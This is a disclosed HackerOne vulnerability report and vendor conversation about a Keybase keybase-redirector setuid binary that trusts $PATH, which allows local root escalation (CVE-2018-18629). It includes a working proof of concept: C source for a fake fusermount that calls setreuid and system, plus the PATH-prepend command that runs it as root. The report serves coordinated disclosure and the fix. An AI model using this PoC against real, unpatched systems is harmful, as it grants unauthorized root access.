{"id":426944,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjY5NDQ=","url":"https://hackerone.com/reports/426944","title":"Linux privilege escalation via trusted $PATH in keybase-redirector ","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-10-22T21:31:56.447Z","submitted_at":"2018-10-22T21:31:56.447Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mirchr","url":"/mirchr","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2809,"url":"https://hackerone.com/keybase","handle":"keybase","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Keybase","twitter_handle":"keybaseio","website":"https://keybase.io","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-12-18T20:11:53.367Z","bug_reporter_agreed_on_going_public_at":"2018-12-18T20:11:53.293Z","team_member_agreed_on_going_public_at":"2018-12-18T19:38:03.254Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"keybase-redirector is a setuid root binary. keybase-redirector calls the fusermount binary using a relative path and the application trusts the value of $PATH. This allows a local, unprivileged user to trick the application to executing a custom fusermount binary as root.\n\n###Environment\n\nCentOS Linux release 7.4.1708 (Core)\n3.10.0-693.17.1.el7.x86_64\n\nRPM info\n```\nName        : keybase\nVersion     : 2.8.0.20181017144746.3efc4cbf3c\nRelease     : 1\nArchitecture: x86_64\nInstall Date: Mon 22 Oct 2018 05:30:36 PM EDT\nGroup       : Unspecified\nSize        : 273302678\nLicense     : BSD\nSignature   : RSA/SHA256, Wed 17 Oct 2018 10:55:21 AM EDT, Key ID 47484e50656d16c7\nSource RPM  : keybase-2.8.0.20181017144746.3efc4cbf3c-1.src.rpm\nBuild Date  : Wed 17 Oct 2018 10:54:47 AM EDT\nBuild Host  : 6ae61e160e87\nRelocations : (not relocatable)\nSummary     : Keybase command line client\nDescription :\nKeybase command line client\n```\nAn unprivileged user named user1 is used for this PoC.\n\n###Steps to reproduce\n\n####1) Display privileges of user 1 - execute the id command\n```\n[user1@localhost woot]$ id\nuid=1000(user1) gid=1000(user1) groups=1000(user1) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n```\n\n####2) Create a custom fusermount application. This PoC will create /w00t as root. Arbitrary commands can be executed.\n\n```\ncat \u003efusermount.c\u003c\u003cEOF\n#include \u003cstdio.h\u003e\n#include \u003cstdlib.h\u003e\n#include \u003csys/types.h\u003e\n#include \u003cunistd.h\u003e\n\nint main(int argc, char **argv)\n{\n  setreuid(0,0);\n  system(\"/usr/bin/touch /w00t\");\n  return(0);\n}\nEOF\n```\n####3) Compile fusermount.c\n```\ngcc -Wall fusermount.c -o fusermount\n```\n\n####4) Verify that /w00t does not exist.\n```\n[user1@localhost woot]$ ls -ld /w00t\nls: cannot access /w00t: No such file or directory\n```\n\n####5) Prepend the PATH environment variable with a dot(for current working directory) and execute keybase-redirector which in turn will execute the malicious fusermount binary as root.\n\n```\nenv PATH=.:$PATH /usr/bin/keybase-redirector /keybase\n```\n####6) Enter the control-c sequence to kill the application.\n```\n[user1@localhost woot]$ env PATH=.:$PATH /usr/bin/keybase-redirector /keybase\n^C\n```\n####7) Verify that /w00t exists\n```\n[user1@localhost woot]$ ls -ld /w00t\n-rw-rw-r--. 1 root user1 0 Oct 22 16:34 /w00t\n[user1@localhost woot]$\n```\n\n## Impact\n\nUnauthorized root access is possible which impacts the confidentially, integrity, and availability of the system.","vulnerability_information_html":"\u003cp\u003ekeybase-redirector is a setuid root binary. keybase-redirector calls the fusermount binary using a relative path and the application trusts the value of $PATH. This allows a local, unprivileged user to trick the application to executing a custom fusermount binary as root.\u003c/p\u003e\n\n\u003ch3 id=\"environment\"\u003eEnvironment\u003c/h3\u003e\n\n\u003cp\u003eCentOS Linux release 7.4.1708 (Core)\u003cbr\u003e\n3.10.0-693.17.1.el7.x86_64\u003c/p\u003e\n\n\u003cp\u003eRPM info\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eName        : keybase\nVersion     : 2.8.0.20181017144746.3efc4cbf3c\nRelease     : 1\nArchitecture: x86_64\nInstall Date: Mon 22 Oct 2018 05:30:36 PM EDT\nGroup       : Unspecified\nSize        : 273302678\nLicense     : BSD\nSignature   : RSA/SHA256, Wed 17 Oct 2018 10:55:21 AM EDT, Key ID 47484e50656d16c7\nSource RPM  : keybase-2.8.0.20181017144746.3efc4cbf3c-1.src.rpm\nBuild Date  : Wed 17 Oct 2018 10:54:47 AM EDT\nBuild Host  : 6ae61e160e87\nRelocations : (not relocatable)\nSummary     : Keybase command line client\nDescription :\nKeybase command line client\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAn unprivileged user named user1 is used for this PoC.\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h3\u003e\n\n\u003ch4 id=\"1-display-privileges-of-user-1-execute-the-id-command\"\u003e1) Display privileges of user 1 - execute the id command\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[user1@localhost woot]$ id\nuid=1000(user1) gid=1000(user1) groups=1000(user1) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"2-create-a-custom-fusermount-application-this-poc-will-create-w00t-as-root-arbitrary-commands-can-be-executed\"\u003e2) Create a custom fusermount application. This PoC will create /w00t as root. Arbitrary commands can be executed.\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecat \u0026gt;fusermount.c\u0026lt;\u0026lt;EOF\n#include \u0026lt;stdio.h\u0026gt;\n#include \u0026lt;stdlib.h\u0026gt;\n#include \u0026lt;sys/types.h\u0026gt;\n#include \u0026lt;unistd.h\u0026gt;\n\nint main(int argc, char **argv)\n{\n  setreuid(0,0);\n  system(\u0026quot;/usr/bin/touch /w00t\u0026quot;);\n  return(0);\n}\nEOF\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"3-compile-fusermount-c\"\u003e3) Compile fusermount.c\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003egcc -Wall fusermount.c -o fusermount\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"4-verify-that-w00t-does-not-exist\"\u003e4) Verify that /w00t does not exist.\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[user1@localhost woot]$ ls -ld /w00t\nls: cannot access /w00t: No such file or directory\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"5-prepend-the-path-environment-variable-with-a-dot-for-current-working-directory-and-execute-keybase-redirector-which-in-turn-will-execute-the-malicious-fusermount-binary-as-root\"\u003e5) Prepend the PATH environment variable with a dot(for current working directory) and execute keybase-redirector which in turn will execute the malicious fusermount binary as root.\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eenv PATH=.:$PATH /usr/bin/keybase-redirector /keybase\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"6-enter-the-control-c-sequence-to-kill-the-application\"\u003e6) Enter the control-c sequence to kill the application.\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[user1@localhost woot]$ env PATH=.:$PATH /usr/bin/keybase-redirector /keybase\n^C\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"7-verify-that-w00t-exists\"\u003e7) Verify that /w00t exists\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[user1@localhost woot]$ ls -ld /w00t\n-rw-rw-r--. 1 root user1 0 Oct 22 16:34 /w00t\n[user1@localhost woot]$\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eUnauthorized root access is possible which impacts the confidentially, integrity, and availability of the system.\u003c/p\u003e\n","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":245,"voters":["mirchr","honoki","samengmg","sp1d3rs","cdl","kapytein","heeeeen","michiel","jackspa22ow","suv","and 235 more..."],"severity":{"rating":"high","score":7.8,"author_type":"User","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3517014,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for the great report. We're looking into it with highest priority.","markdown_message":"\u003cp\u003eThank you for the great report. We\u0026#39;re looking into it with highest priority.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T00:29:12.120Z","updated_at":"2018-10-23T00:29:12.120Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3517069,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The PoC worked as described, we'll have a fix into master in a few minutes. Thank you.","markdown_message":"\u003cp\u003eThe PoC worked as described, we\u0026#39;ll have a fix into master in a few minutes. Thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T00:44:24.148Z","updated_at":"2018-10-23T00:44:24.148Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3517088,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"PR up here: https://github.com/keybase/kbfs/pull/1869#pullrequestreview-167168122","markdown_message":"\u003cp\u003ePR up here: \u003ca title=\"https://github.com/keybase/kbfs/pull/1869#pullrequestreview-167168122\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fkeybase%2Fkbfs%2Fpull%2F1869%23pullrequestreview-167168122\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/keybase/kbfs/pull/1869#pullrequestreview-167168122\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T00:54:37.398Z","updated_at":"2018-10-23T00:54:37.398Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3517123,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@maxtaco Thank you for the prompt response! I reviewed the fix and it looks good. I will also verify the fix once it has been merged. I would like to coordinate a public disclosure with you. Do you plan to publish an advisory for this vulnerability? I have requested a CVE from MITRE and will send it when received. Thank you.","markdown_message":"\u003cp\u003e\u003ca href=\"/maxtaco\"\u003e@maxtaco\u003c/a\u003e Thank you for the prompt response! I reviewed the fix and it looks good. I will also verify the fix once it has been merged. I would like to coordinate a public disclosure with you. Do you plan to publish an advisory for this vulnerability? I have requested a CVE from MITRE and will send it when received. Thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T01:18:28.805Z","updated_at":"2018-10-23T01:18:28.805Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3517133,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, here is what we would like to do: we'd like to make a release tomorrow with the above PR.  Then we'd like to let our users upgrade to the new version (on Linux, this can take some time). Then, once we have enough of our users running the updated version, we can disable the old version on the server side, coordinated with a public disclosure.  Does that work for you?","markdown_message":"\u003cp\u003eYes, here is what we would like to do: we\u0026#39;d like to make a release tomorrow with the above PR.  Then we\u0026#39;d like to let our users upgrade to the new version (on Linux, this can take some time). Then, once we have enough of our users running the updated version, we can disable the old version on the server side, coordinated with a public disclosure.  Does that work for you?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T01:21:48.299Z","updated_at":"2018-10-23T01:21:48.299Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3517138,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, that works for me. Do you think we can disclose this within 90 days(January 20, 2019)? Thank you!","markdown_message":"\u003cp\u003eYes, that works for me. Do you think we can disclose this within 90 days(January 20, 2019)? Thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T01:25:25.913Z","updated_at":"2018-10-23T01:25:25.913Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3517150,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, I think that seems doable.  We'll get the bounty out soon too. Thank you for the excellent work!\n\nBTW, how did you find it?  I was thrown because it wasn't immediately obvious to me that `fuse.Mount` shelled out (though I didn't write this code).","markdown_message":"\u003cp\u003eYes, I think that seems doable.  We\u0026#39;ll get the bounty out soon too. Thank you for the excellent work!\u003c/p\u003e\n\n\u003cp\u003eBTW, how did you find it?  I was thrown because it wasn\u0026#39;t immediately obvious to me that \u003ccode\u003efuse.Mount\u003c/code\u003e shelled out (though I didn\u0026#39;t write this code).\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T01:32:01.197Z","updated_at":"2018-10-23T01:32:01.197Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3517178,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You're welcome and thank you!\n\nAfter starting keybase from a low privileged account I noticed the keybase-redirector was running with root privileges which peaked my interest. I found it initially by running the binary with an invalid path and observed for errors. To my surprise, there was one so I investigated further using the strace utility. Once it appeared to be vulnerable I attempted to exploit it.\n\n\n\nSet PATH=/foobar and see if there are errors. In this case the error was very descriptive.\n```\n[user1@localhost ~]$ env PATH=/foobar /usr/bin/keybase-redirector /keybase\nMount error, exiting cleanly: fusermount: exec: \"fusermount\": executable file not found in $PATH\n```\n\nI traced the system calls with the strace utility while still using /foobar as the $PATH. Note the reference to /foobar/fusermount in the second argument to newfstatat(). At this point I was confident I could influence the program to execute my version of fusermount so I wrote the PoC.\n\n```\n[root@localhost ~]# env PATH=/foobar /usr/bin/strace -u user1 -ff /usr/bin/keybase-redirector /keybase 2\u003e\u00261|grep foobar\n[pid  4890] newfstatat(AT_FDCWD, \"/foobar/fusermount\", 0xc420070858, 0) = -1 ENOENT (No such file or directory)\n```\n\n","markdown_message":"\u003cp\u003eYou\u0026#39;re welcome and thank you!\u003c/p\u003e\n\n\u003cp\u003eAfter starting keybase from a low privileged account I noticed the keybase-redirector was running with root privileges which peaked my interest. I found it initially by running the binary with an invalid path and observed for errors. To my surprise, there was one so I investigated further using the strace utility. Once it appeared to be vulnerable I attempted to exploit it.\u003c/p\u003e\n\n\u003cp\u003eSet PATH=/foobar and see if there are errors. In this case the error was very descriptive.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[user1@localhost ~]$ env PATH=/foobar /usr/bin/keybase-redirector /keybase\nMount error, exiting cleanly: fusermount: exec: \u0026quot;fusermount\u0026quot;: executable file not found in $PATH\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI traced the system calls with the strace utility while still using /foobar as the $PATH. Note the reference to /foobar/fusermount in the second argument to newfstatat(). At this point I was confident I could influence the program to execute my version of fusermount so I wrote the PoC.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[root@localhost ~]# env PATH=/foobar /usr/bin/strace -u user1 -ff /usr/bin/keybase-redirector /keybase 2\u0026gt;\u0026amp;1|grep foobar\n[pid  4890] newfstatat(AT_FDCWD, \u0026quot;/foobar/fusermount\u0026quot;, 0xc420070858, 0) = -1 ENOENT (No such file or directory)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-10-23T01:56:30.035Z","updated_at":"2018-10-23T01:56:30.035Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3517197,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ah, that makes sense. The fix is merged BTW, ok to close this?","markdown_message":"\u003cp\u003eAh, that makes sense. The fix is merged BTW, ok to close this?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T02:15:00.057Z","updated_at":"2018-10-23T02:15:00.057Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3517284,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes. I will add the CVE number when MITRE responds. Thanks!","markdown_message":"\u003cp\u003eYes. I will add the CVE number when MITRE responds. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T03:08:26.657Z","updated_at":"2018-10-23T03:08:26.657Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3519994,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-23T12:44:56.378Z","updated_at":"2018-10-23T12:44:56.378Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mirchr","url":"/mirchr"},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3519996,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the excellent work here!","markdown_message":"\u003cp\u003eThanks for the excellent work here!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-23T12:45:12.250Z","updated_at":"2018-10-23T12:45:12.250Z","actor":{"url":"/keybase","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Keybase"}},"bounty_amount":"5000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"keybase","collaborator":{"username":"mirchr","url":"/mirchr"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3522877,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@keybase Thank you the generous reward! I really appreciate it.","markdown_message":"\u003cp\u003e\u003ca href=\"/keybase\"\u003e@keybase\u003c/a\u003e Thank you the generous reward! I really appreciate it.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-24T00:20:26.155Z","updated_at":"2018-10-24T00:20:26.155Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3522889,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@keybase , @maxtaco MITRE has assigned CVE-2018-18629 for this vulnerability. Please let me know when you're ready to publish an advisory. I will need to send the advisory URL to MITRE. Thank you.","markdown_message":"\u003cp\u003e\u003ca href=\"/keybase\"\u003e@keybase\u003c/a\u003e , \u003ca href=\"/maxtaco\"\u003e@maxtaco\u003c/a\u003e MITRE has assigned CVE-2018-18629 for this vulnerability. Please let me know when you\u0026#39;re ready to publish an advisory. I will need to send the advisory URL to MITRE. Thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-24T00:23:46.928Z","updated_at":"2018-10-24T00:23:46.928Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3843230,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @maxtaco . We're approaching the 60 day mark and wanted to touch base with you regarding coordinated disclosure. Do you have an idea when the vulnerable version will be disabled server side and an advisory released? Please reference the above CVE in the advisory. Once the advisory is public I will request Mitre to reference the link. Would you be ok if I wrote a blog post on this issue? I will not make this public until the disclosure date. Thanks!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/maxtaco\"\u003e@maxtaco\u003c/a\u003e . We\u0026#39;re approaching the 60 day mark and wanted to touch base with you regarding coordinated disclosure. Do you have an idea when the vulnerable version will be disabled server side and an advisory released? Please reference the above CVE in the advisory. Once the advisory is public I will request Mitre to reference the link. Would you be ok if I wrote a blog post on this issue? I will not make this public until the disclosure date. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T00:27:43.777Z","updated_at":"2018-12-18T00:27:43.777Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3843286,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I attempted to edit the previous comment but there was an error.  I can also delay the release of blog post for a few weeks after the advisory if you would prefer. Thanks!","markdown_message":"\u003cp\u003eI attempted to edit the previous comment but there was an error.  I can also delay the release of blog post for a few weeks after the advisory if you would prefer. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T01:03:48.481Z","updated_at":"2018-12-18T01:03:48.481Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3843351,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your patience, hopefully by the end of the week on this disclosure. Not sure about the other stuff just yet.","markdown_message":"\u003cp\u003eThanks for your patience, hopefully by the end of the week on this disclosure. Not sure about the other stuff just yet.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T01:31:17.932Z","updated_at":"2018-12-18T01:31:17.932Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3843393,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you. The primary purpose of the post is for other researchers to learn. It will be a technical walkthrough. If you want I can create a draft and have you review it. I appreciate the consideration.  I think Keybase is an awesome application and will not cast it in a negative light. I will also be highlighting the impressive response time. I will respect whatever you decide. Thanks!","markdown_message":"\u003cp\u003eThank you. The primary purpose of the post is for other researchers to learn. It will be a technical walkthrough. If you want I can create a draft and have you review it. I appreciate the consideration.  I think Keybase is an awesome application and will not cast it in a negative light. I will also be highlighting the impressive response time. I will respect whatever you decide. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T01:54:35.362Z","updated_at":"2018-12-18T01:54:35.362Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3849844,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@maxtaco Here is the current description that Mitre has on file for CVE-2018-18629. When the advisory is released the CVE entry will become public. The description can be updated prior to going public if needed.\n\n```\n[Suggested description]\nAn issue was discovered in the Keybase command-line client \n2.8.0.20181017144746.3efc4cbf3c for Linux. An untrusted search path vulnerability in\nthe keybase-redirector application allows a local, unprivileged user on Linux\nto gain root privileges via a Trojan horse binary.\n```","markdown_message":"\u003cp\u003e\u003ca href=\"/maxtaco\"\u003e@maxtaco\u003c/a\u003e Here is the current description that Mitre has on file for CVE-2018-18629. When the advisory is released the CVE entry will become public. The description can be updated prior to going public if needed.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[Suggested description]\nAn issue was discovered in the Keybase command-line client \n2.8.0.20181017144746.3efc4cbf3c for Linux. An untrusted search path vulnerability in\nthe keybase-redirector application allows a local, unprivileged user on Linux\nto gain root privileges via a Trojan horse 